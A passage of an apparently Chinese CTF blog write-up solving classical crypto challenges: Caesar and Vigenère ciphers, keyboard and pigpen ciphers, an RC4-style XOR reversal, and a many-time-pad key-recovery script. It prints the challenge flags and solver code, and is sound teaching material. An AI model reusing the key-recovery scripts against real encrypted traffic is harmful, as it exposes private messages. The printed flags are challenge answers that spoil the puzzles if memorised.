01010111 01110100 01101111 01100010 01101101 01110011 01110101 01001001 01000111 01101100 01110010 01100101 01000111 
01110011 01100111 01100100 01001000 01010101 01100111 01100011 01111001 01000010 01101010 01100101 01011000 01001110 
01110101 01001001 01000111 01001110 01101110 01100101 01000011 01000010 01111010 01100101 01011000 01101011 01100111 
01100011 01010111 01100100 01101101 01100101 01000011 01000010 01110000 01100011 00110011 01101000 01101100 01001001 
01000111 01110100 01101010 01011001 00110010 01100100 00110100 01011010 01001000 01010101 00110110 01001001 01000111 
01011010 01101011 01011001 00110011 01101100 01111010 01100010 01101110 01110100 01101111 01001101 01001000 01011010 
01100110 01011010 01000111 01101011 00110000 01011010 01001000 01010110 01100110 01100100 01101101 01101011 00110000 
01011010 01000110 00111001 00110000 01011000 00110011 01001001 00110000 01100101 01011000 01101100 01100110 01100011 
01101110 01101000 01111000 01100010 01000111 01010001 01110111 01100110 01010011 00110100 01100111 01100011 01010111 
01100100 01101101 01001001 01001000 01011010 00110000 01100101 01011000 01101011 01100111 01011001 00110011 01010010 
01101111 01011010 01010011 01000010 01101011 01100001 01011000 01001110 01101011 01001001 01001000 01001101 01100111 
01100101 01010111 01100100 01101011 01001001 01000111 01100100 01101010 01001001 01001000 01001010 00110100 01100011 
01010111 01111000 01101011 01011010 00110010 00110101 00110100 01100011 00110010 01111000 01110000 01100011 01010011 
01000010 00110000 01100100 01010011 01000010 01110111 01011010 01101110 01010110 01101011 01001001 01001000 01110000 
01101101 01100100 01001000 01101100 01101100 01100100 01000111 01101000 01110101 01001001 01000111 01100100 01101010 
01011001 01111001 01000010 01101011 01100001 01011000 01010010 00110001 01001001 01001000 01010110 01101110 01100101 
01000111 01010001 01100111 01011010 00110010 01001101 01100111 01100101 01101110 01001110 00110001 01100100 01001000 
01001001 01100111 01011001 01101101 01101000 01101110 01100100 01101110 01101100 01110010 01011010 01010111 00110101 
01110010 01001100 01000011 01000010 01111010 01100001 01000111 01010101 01100111 01100100 01000111 01010001 01100111 
01100101 01000111 01110100 01111010 01100101 01011000 01101100 01111000 01001001 01001000 01010010 00110001 01001001 
01000111 01101000 01101110 01011010 01000011 01000010 00110001 01011010 01111001 01000010 00110110 01100011 00110010 
01010101 01100111 01100011 00110010 01001110 01101011 01100001 00110011 01100111 01100111 01100011 00110011 01101100 
00110101 01001100 01101001 01000010 01110000 01011010 00110010 01111000 01110010 01001001 01001000 01000110 01101110 
01011010 01101001 01000010 01110010 01100001 01001000 01000010 01101110 01100011 01010111 01110100 01101100 01001001 
01000111 01010010 01110000 01100001 01111001 01000010 01111001 01100001 01011000 01001110 00110101 01100101 01010111 
01110100 01101111 01100010 01101101 01110011 01101000"""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
plaintext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>t<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
kaisa <span class="token operator">=</span> <span class="token string">"kvbsqrd, iye'bo kvwycd drobo! Xyg pyb dro psxkv (kxn wkilo dro rkbnocd...) zkbd: k celcdsdedsyx mszrob. Sx dro pyvvygsxq dohd, S'fo dkuox wi wocckqo kxn bozvkmon ofobi kvzrklodsm mrkbkmdob gsdr k mybboczyxnoxmo dy k nsppoboxd mrkbkmdob - uxygx kc k celcdsdedsyx mszrob. Mkx iye psxn dro psxkv pvkq? rsxd: Go uxyg drkd dro pvkq sc qysxq dy lo yp dro pybwkd edpvkq&#123;...&#125; - grsmr wokxc drkd sp iye coo drkd zkddobx, iye uxyg grkd dro mybboczyxnoxmoc pyb e, d, p, v k, kxn q kbo. Iye mkx zbylklvi gybu yed dro bowksxsxq mrkbkmdobc li bozvkmsxq drow kxn sxpobbsxq mywwyx gybnc sx dro Oxqvscr vkxqekqo. Kxydrob qbokd wodryn sc dy eco pboaeoxmi kxkvicsc: go uxyg drkd 'o' crygc ez wycd ypdox sx dro kvzrklod, cy drkd'c zbylklvi dro wycd mywwyx mrkbkmdob sx dro dohd, pyvvygon li 'd', kxn cy yx. Yxmo iye uxyg k pog mrkbkmdobc, iye mkx sxpob dro bocd yp dro gybnc lkcon yx mywwyx gybnc drkd cryg ez sx dro Oxqvscr vkxqekqo."</span>
cipin <span class="token operator">=</span> <span class="token string">"rghnxsdfysdtghu! qgf isak cthtuike dik zknthhkx rxqldgnxsliq risyykhnk. ikxk tu s cysn cgx syy qgfx isxe kccgxdu: fdcysn&#123;h0v_di4du_vi4d_t_r4yy_rxqld0&#125;. qgf vtyy cthe disd s ygd gc rxqldgnxsliq tu pfud zftyethn gcc ditu ugxd gc zsutr bhgvykenk, she td xksyyq tu hgd ug zse scdkx syy. iglk qgf khpgqke dik risyykhnk!"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tmp <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> kaisa<span class="token punctuation">:</span>
        tmp <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">] '</span></span> <span class="token operator">+</span> tmp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>转十进制，转char，转base64，最后看出来flag那部分是词频分析，直接在线quipquip解得</p>
<p><img src="/2021/05/28/CTF/image-20210726210941538.png" alt></p>
<p><code>flag&#123;n0w_th4ts_wh4t_i_c4ll_crypt0&#125;</code></p>
<h4 id="ACTF新生赛2020-crypto-classic1"><a href="#ACTF新生赛2020-crypto-classic1" class="headerlink" title="[ACTF新生赛2020]crypto-classic1"></a>[ACTF新生赛2020]crypto-classic1</h4><p><strong>TAG: 键盘密码， 维吉尼亚</strong></p>
<p>先是键盘密码</p>
<pre class="line-numbers language-none"><code class="language-none">哇，这里有压缩包的密码哦，于是我低下了头，看向了我的双手，试图从中找到某些规律
xdfv ujko98 edft54 xdfv pok,.; wsdr43
circle<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>得压缩包内容为</p>
<pre class="line-numbers language-none"><code class="language-none">SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;
解维吉尼亚得.密钥为sp
我没解出来，看大哥写的脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>大哥写的脚本如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#破解key</span>
s<span class="token operator">=</span><span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span> 
s1<span class="token operator">=</span><span class="token string">'ACTF'</span> 
s2<span class="token operator">=</span><span class="token string">'SRLU'</span> 
key <span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    key<span class="token operator">+=</span>s<span class="token punctuation">[</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span>s<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span> 
<span class="token keyword">print</span> key
 
 
<span class="token comment">#解密</span>
cipher <span class="token operator">=</span> <span class="token string">'SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;'</span>
key <span class="token operator">=</span> <span class="token string">'SP'</span>
<span class="token comment">#decode</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	flag <span class="token operator">+=</span> table<span class="token punctuation">[</span><span class="token punctuation">(</span>table<span class="token punctuation">.</span>find<span class="token punctuation">(</span>cipher<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">26</span><span class="token operator">-</span>table<span class="token punctuation">.</span>find<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> flag
<span class="token comment">#ACTFHWHATKAKCLASSICALKVIGENEREH</span>
 
<span class="token triple-quoted-string string">'''
cipher = SRLU&#123;LZPL_S_UASHKXUPD_NXYTFTJT&#125;
ACTF&#123;WHAT_A_CLASSICAL_VIGENERE&#125;
flag&#123;what_a_classical_vigenere&#125;
'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="NPUCTF2020-Classical-Cipher"><a href="#NPUCTF2020-Classical-Cipher" class="headerlink" title="[NPUCTF2020]Classical Cipher"></a>[NPUCTF2020]Classical Cipher</h4><p><strong>TAG: 词频分析、符号密码</strong></p>
<p><img src="/2021/05/28/CTF/image-20210727142612399.png" alt></p>
<p>找出来key，然后获得一张图片，猪圈密码看得出来，那个动物的那个不知道是什么加密了，猜猜就好了。</p>
<p><img src="/2021/05/28/CTF/image-20210727142847265.png" alt></p>
<p><img src="/2021/05/28/CTF/image-20210727143845598.png" alt="变形猪圈"></p>
<p><img src="/2021/05/28/CTF/image-20210727145244333.png" alt="符号解密"></p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;classicalcode&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="普通异或加密"><a href="#普通异或加密" class="headerlink" title="普通异或加密"></a>普通异或加密</h3><h4 id="EasyProgram"><a href="#EasyProgram" class="headerlink" title="EasyProgram"></a>EasyProgram</h4><pre class="line-numbers language-none"><code class="language-none">get buf unsign s[256]
get buf t[256]
we have key:whoami
we have flag:????????????????????????????????

for i:0 to 256
    set s[i]:i

for i:0 to 256
    set t[i]:key[(i)mod(key.lenth)]

for i:0 to 256
    set j:(j+s[i]+t[i])mod(256)
        swap:s[i],s[j]

for m:0 to 38
    set i:(i + 1)mod(256)
    set j:(j + S[i])mod(256)
    swap:s[i],s[j]
    set x:(s[i] + (s[j]mod(256))mod(256))
    set flag[m]:flag[m]^s[x]

fprint flagx to file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>分析一下上面的伪代码<code>set flag[m]:flag[m]^s[x]</code>，只有这一句有flag参与了运算，根据异或运算的可逆性，这里我们只需要获得<code>s[x]</code>就能进而获得flag的内容了。写出逆代码。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii


s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
key <span class="token operator">=</span> <span class="token string">'whoami'</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
ciphertext <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'file.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    tmp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>b2a_hex<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    tmp <span class="token operator">=</span> tmp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        temp <span class="token operator">=</span> <span class="token string">'0x'</span> <span class="token operator">+</span> tmp<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span>
        ciphertext<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    s<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

j <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>

i <span class="token operator">=</span> <span class="token number">0</span>
j <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>
    j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span>
    s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    x <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">^</span> s<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
<span class="token comment"># flag&#123;f238yu28323uf28u2yef2ud8uf289euf&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="一次一密"><a href="#一次一密" class="headerlink" title="一次一密"></a>一次一密</h3><blockquote>
<p>题目类型应该以buu上的<code>你听说过一次一密么？</code>这道题目开始的，此类题目有一种共同的解法，因此将其分为一类。英文名应该是叫做<code>many-time-pad-attack</code>这种攻击。</p>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
<span class="token comment">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span>
<span class="token comment"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span>

<span class="token keyword">import</span> string
<span class="token keyword">import</span> collections
<span class="token keyword">import</span> sets<span class="token punctuation">,</span> sys

<span class="token comment"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span>

c1 <span class="token operator">=</span> <span class="token string">'25030206463d3d393131555f7f1d061d4052111a19544e2e5d'</span>
c2 <span class="token operator">=</span> <span class="token string">'0f020606150f203f307f5c0a7f24070747130e16545000035d'</span>
c3 <span class="token operator">=</span> <span class="token string">'1203075429152a7020365c167f390f1013170b1006481e1314'</span>
c4 <span class="token operator">=</span> <span class="token string">'0f4610170e1e2235787f7853372c0f065752111b15454e0e09'</span>
c5 <span class="token operator">=</span> <span class="token string">'081543000e1e6f3f3a3348533a270d064a02111a1b5f4e0a18'</span>
c6 <span class="token operator">=</span> <span class="token string">'0909075412132e247436425332281a1c561f04071d520f0b11'</span>
c7 <span class="token operator">=</span> <span class="token string">'4116111b101e2170203011113a69001b475206011552050219'</span>
c8 <span class="token operator">=</span> <span class="token string">'041006064612297020375453342c17545a01451811411a470e'</span>
c9 <span class="token operator">=</span> <span class="token string">'021311114a5b0335207f7c167f22001b44520c15544801125d'</span>
c10 <span class="token operator">=</span> <span class="token string">'06140611460c26243c7f5c167f3d015446010053005907145d'</span>
c11 <span class="token operator">=</span> <span class="token string">'0f05110d160f263f3a7f4210372c03111313090415481d49'</span>
ciphers <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">,</span> c4<span class="token punctuation">,</span> c5<span class="token punctuation">,</span> c6<span class="token punctuation">,</span> c7<span class="token punctuation">,</span> c8<span class="token punctuation">,</span> c9<span class="token punctuation">,</span> c10<span class="token punctuation">,</span> c11<span class="token punctuation">]</span>


<span class="token comment"># The target ciphertext we want to crack</span>
<span class="token comment"># target_cipher = "0529242a631234122d2b36697f13272c207f2021283a6b0c7908"</span>

<span class="token comment"># XORs two string</span>
<span class="token keyword">def</span> <span class="token function">strxor</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># xor two strings (trims the longer input)</span>
    <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">target_fix</span><span class="token punctuation">(</span>target_cipher<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># To store the final key</span>
    final_key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">150</span>
    <span class="token comment"># To store the positions we know are broken</span>
    known_key_positions <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># For each ciphertext</span>
    <span class="token keyword">for</span> current_index<span class="token punctuation">,</span> ciphertext <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>
        counter <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment"># for each other ciphertext</span>
        <span class="token keyword">for</span> index<span class="token punctuation">,</span> ciphertext2 <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> current_index <span class="token operator">!=</span> index<span class="token punctuation">:</span>  <span class="token comment"># don't xor a ciphertext with itself</span>
                <span class="token keyword">for</span> indexOfChar<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>
                        strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ciphertext2<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Xor the two ciphertexts</span>
                    <span class="token comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don't know which one)</span>
                    <span class="token keyword">if</span> char <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable <span class="token keyword">and</span> char<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> counter<span class="token punctuation">[</span>
                        indexOfChar<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># Increment the counter at this index</span>
        knownSpaceIndexes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

        <span class="token comment"># Loop through all positions where a space character was possible in the current_index cipher</span>
        <span class="token keyword">for</span> ind<span class="token punctuation">,</span> val <span class="token keyword">in</span> counter<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span>
            <span class="token keyword">if</span> val <span class="token operator">>=</span> <span class="token number">7</span><span class="token punctuation">:</span> knownSpaceIndexes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ind<span class="token punctuation">)</span>
        <span class="token comment"># print knownSpaceIndexes # Shows all the positions where we now know the key!</span>

        <span class="token comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span>
        xor_with_spaces <span class="token operator">=</span> strxor<span class="token punctuation">(</span>ciphertext<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">' '</span> <span class="token operator">*</span> <span class="token number">150</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> index <span class="token keyword">in</span> knownSpaceIndexes<span class="token punctuation">:</span>
            <span class="token comment"># Store the key's value at the correct position</span>
            final_key<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> xor_with_spaces<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
            <span class="token comment"># Record that we known the key at this position</span>
            known_key_positions<span class="token punctuation">.</span>add<span class="token punctuation">(</span>index<span class="token punctuation">)</span>

    <span class="token comment"># Construct a hex key from the currently known key, adding in '00' hex chars where we do not know (to make a complete hex string)</span>
    final_key_hex <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>val <span class="token keyword">if</span> val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">else</span> <span class="token string">'00'</span> <span class="token keyword">for</span> val <span class="token keyword">in</span> final_key<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token comment"># Xor the currently known key with the target cipher</span>
    output <span class="token operator">=</span> strxor<span class="token punctuation">(</span>target_cipher<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> final_key_hex<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span> <span class="token string">"Fix this sentence:"</span>
    <span class="token keyword">print</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>char <span class="token keyword">if</span> index <span class="token keyword">in</span> known_key_positions <span class="token keyword">else</span> <span class="token string">'*'</span> <span class="token keyword">for</span> index<span class="token punctuation">,</span> char <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"n"</span>

    <span class="token comment"># WAIT.. MANUAL STEP HERE</span>
    <span class="token comment"># This output are printing a * if that character is not known yet</span>
    <span class="token comment"># fix the missing characters like this: "Let*M**k*ow if *o&#123;*a" = "cure, Let Me know if you a"</span>
    <span class="token comment"># if is too hard, change the target_cipher to another one and try again</span>
    <span class="token comment"># and we have our key to fix the entire text!</span>

    <span class="token comment"># sys.exit(0) #comment and continue if u got a good key</span>

    target_plaintext <span class="token operator">=</span> <span class="token string">"cure, Let Me know if you a"</span>
    <span class="token keyword">print</span> <span class="token string">"Fixed:"</span>
    <span class="token keyword">print</span> target_plaintext <span class="token operator">+</span> <span class="token string">"n"</span>

